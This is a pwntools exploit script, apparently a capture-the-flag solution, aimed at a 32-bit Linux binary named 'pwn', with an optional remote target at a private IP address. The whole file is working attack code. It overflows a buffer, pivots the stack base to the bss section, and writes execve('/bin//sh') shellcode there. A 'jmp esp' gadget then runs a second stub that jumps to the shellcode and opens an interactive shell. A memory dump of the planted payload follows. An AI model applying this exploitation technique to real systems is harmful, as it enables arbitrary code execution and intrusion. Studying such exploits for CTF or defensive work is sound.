from pwn import *
context(os='linux',arch='i386',aslr = 'False')#,log_level='debug')
local = 1
#log_level='debug'
if local:
	p = process("./pwn")#,env={'LD_PRELOAD':'./libc_x64.so.6'})
	elf = ELF("./pwn")
	#libc = ELF('./libc_x64.so.6')
else:
	p = remote("172.29.20.120",9999)
	
	pass
hint = 0x8048551
# 0x8048512 fgets one more time
def exp():
	bss = 0x0804A120
	# shellcode part 2 :  read to bss(0x804a100)
	shellcode1 = asm("push 0;push 0x68732f2f;push 0x6e69622f;mov ebx,esp;xor ecx,ecx;mov edx,ecx;int 0x80;")

	# shellcode part 1 : jmp to another shellcode
	shellcode2 = asm("mov ebx,0x804a100;xor eax,eax;push 0xb;pop eax;jmp ebx;")
	print disasm(shellcode2)
	print len(shellcode2)
	print disasm(shellcode1)
	print len(shellcode1)
	payload = "\x00"*0x20 + p32(bss) + p32(0x8048512)# control ebp = bss's addr; lea    eax,[ebp-0x20] and control the fgets addr
	payload = payload.ljust(49,"\xee")
	payload += shellcode1 # write to bss 0x0804A100
	print len(payload)
	payload = payload.ljust(81,"B")
	payload += shellcode2[0:4] + p32(hint) + shellcode2[4:] 
	# leave ret -> mov esp,ebp;pop ebp
	# hint : push ebp; mov ebp, esp;jmp  esp; -> exec shellcode2 ,and then jmp to shellcode1
	payload = payload.ljust(100,"\xff")
	p.recv()
	gdb.attach(p,"b *0x8048551\nb *0x8048526")
	p.send(payload)
	
exp()
p.interactive()
'''
0x804a100:	0x2f68006a	0x6868732f	0x6e69622f	0xc931e389
0x804a110:	0x80cdca89	0x42424242	0x42424242	0x42424242
0x804a120:	0x04a100bb	0x08048551	0x6ac03108	0xe3ff580b
0x804a130:	0x000000ff	0x00000000	0x00000000	0x00000000
'''


